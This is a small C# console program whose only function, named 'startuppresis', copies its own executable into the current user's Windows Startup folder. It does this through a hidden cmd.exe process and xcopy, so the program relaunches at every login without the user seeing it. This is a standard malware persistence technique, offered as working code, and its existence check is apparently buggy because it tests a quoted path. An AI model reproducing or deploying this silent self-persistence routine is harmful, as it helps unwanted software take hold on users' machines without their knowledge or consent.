using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp9
{
    class Program
    {
        public static void startuppresis() {
            string lo = System.Reflection.Assembly.GetEntryAssembly().Location;
            string filename = System.AppDomain.CurrentDomain.FriendlyName;
            //Console.WriteLine(lo);
            string currnt_user_name = Environment.UserName;
            string file = @"C:\Users\" + currnt_user_name + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"+ filename;
            string file_loc = @"C:\Users\" + currnt_user_name + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
            file = "\"" + file + "\"";
            file_loc = "\"" + file_loc + "\"";
            lo = "\"" + lo + "\"";
            if (!File.Exists(file))
            {
                Process cmd2 = new Process();
                cmd2.StartInfo.FileName = "cmd.exe";
                cmd2.StartInfo.RedirectStandardInput = true;
                cmd2.StartInfo.RedirectStandardOutput = true;
                cmd2.StartInfo.CreateNoWindow = true;
                cmd2.StartInfo.UseShellExecute = false;
                cmd2.Start();
                cmd2.StandardInput.WriteLine(@"C:");
                cmd2.StandardInput.WriteLine(@"cd  " + file_loc + "");
                cmd2.StandardInput.WriteLine(@"xcopy " + lo + @" "+ filename);
                cmd2.StandardInput.WriteLine(@"F");
                cmd2.StandardInput.WriteLine(@"Yes");
                cmd2.StandardInput.Flush();
                cmd2.StandardInput.Close();
                cmd2.WaitForExit();
                Console.WriteLine(cmd2.StandardOutput.ReadToEnd());


            }
        }
        static void Main(string[] args)
        {
            startuppresis();
            Console.ReadKey();
        }
    }
}
